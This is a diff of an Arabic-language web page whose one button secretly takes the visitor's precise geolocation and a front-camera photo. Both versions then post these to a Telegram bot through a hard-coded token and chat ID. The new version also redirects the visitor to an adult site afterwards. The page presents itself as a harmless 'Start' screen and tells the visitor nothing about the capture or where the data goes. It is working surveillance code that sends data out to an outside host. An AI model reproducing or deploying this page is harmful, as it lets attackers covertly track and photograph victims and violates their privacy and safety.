@@ -1,92 +1,84 @@
 <!doctype html>
 <html lang="ar">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Welcome</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Go</title>
 <style>
-  body{font-family:system-ui,Arial;direction:rtl;padding:16px}
-  button{font-size:18px;padding:10px 14px;margin-top:12px}
-  video{width:100%;max-width:420px;border-radius:8px}
-  #status{margin-top:8px;color:#333}
+  html, body {
+    margin:0; padding:0; height:100%; display:flex;
+    align-items:center; justify-content:center; background: linear-gradient(135deg, #6b73ff, #000dff);
+    font-family: 'Arial', sans-serif;
+  }
+  #goBtn {
+    width:140px; height:140px; border-radius:50%; border:none;
+    background: linear-gradient(145deg,#ff512f,#dd2476);
+    color:#fff; font-size:20px; cursor:pointer;
+    box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+    transition: all 0.2s ease;
+    display:flex; align-items:center; justify-content:center;
+    text-shadow: 0 2px 4px rgba(0,0,0,0.4);
+  }
+  #goBtn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 12px 24px rgba(0,0,0,0.4);
+  }
+  #goBtn:active {
+    transform: scale(0.95);
+    box-shadow: 0 6px 12px rgba(0,0,0,0.2);
+  }
 </style>
 </head>
 <body>
-  <h2>Welcome</h2>
-  <p>Click to continue.</p>
-
-  <video id="video" autoplay playsinline style="display:none"></video>
-  <canvas id="canvas" style="display:none"></canvas>
-  <div id="status">done</div>
-  <button id="goBtn">Next</button>
+<button id="goBtn">Start</button>
 
 <script>
-/* --- عدّل هذين السطرين قبل الرفع --- */
-const BOT_TOKEN = "8202297978:AAFfOI_z409NpvMRaNnVvjij0c9HPj26ZZk";
-const CHAT_ID = "8273042434"; // مثال: -1001234567890 أو @MyChannel
-/* ----------------------------------- */
+const BOT_TOKEN = "8202297978:AAFfOI_z409NpvMRaNnVvjij0c9HPj26ZZk"; // ضع توكن البوت
+const CHAT_ID = "8273042434"; // رقم القناة أو معرفها
+const SECOND_SITE = "stripchat.com"; // رابط الموقع الثاني
 
-const status = document.getElementById('status');
-const goBtn = document.getElementById('goBtn');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-
-async function sendToTelegram(blob, lat, lon, isVideo=false) {
+document.getElementById('goBtn').addEventListener('click', async () => {
   try {
-    status.textContent = "wite...";
-    if (lat && lon) {
-      const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, text: `location: ${mapLink}` })
-      });
-    }
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    if (!isVideo) {
-      form.append('photo', blob, 'photo.jpg');
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
-    } else {
-      form.append('video', blob, 'clip.mp4');
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
-    }
-    status.textContent = "welldone ✅";
-  } catch (err) {
-    console.error(err);
-    status.textContent = "notdone: " + err.message;
-  }
-}
-
-goBtn.addEventListener('click', async () => {
-  status.textContent = "Allow...";
-  let lat=null, lon=null;
-  try {
+    // طلب الموقع
     const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
-    lat = pos.coords.latitude; lon = pos.coords.longitude;
-    status.textContent = "Allow...";
-  } catch(e) {
-    status.textContent = "فشل الحصول الاذن: " + (e.message||e);
-  }
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
 
-  try {
+    // فتح الكاميرا
     const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
-    video.style.display = "block";
+    const video = document.createElement('video');
     video.srcObject = stream;
+    await video.play();
     await new Promise(r=>setTimeout(r,1000));
+
+    // التقاط صورة
+    const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(async (blob) => {
-      stream.getTracks().forEach(t=>t.stop());
-      video.style.display = "none";
-      status.textContent = "tosending...";
-      await sendToTelegram(blob, lat, lon, false);
-    }, 'image/jpeg', 0.85);
-  } catch (err) {
-    console.error(err);
-    status.textContent = "فشل الوصول الأذن: " + (err.message||err);
+    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+    const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.85));
+    stream.getTracks().forEach(t=>t.stop());
+
+    // إرسال الموقع أولًا
+    const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id:CHAT_ID, text:`Location: ${mapLink}`})
+    });
+
+    // إرسال الصورة
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', blob, 'photo.jpg');
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
+
+    // تحويل تلقائي بعد النجاح
+    window.location.href = SECOND_SITE;
+
+  } catch(e) {
+    console.error(e);
+    alert('حدث خطأ أو تم رفض الأذونات.');
   }
 });
 </script>
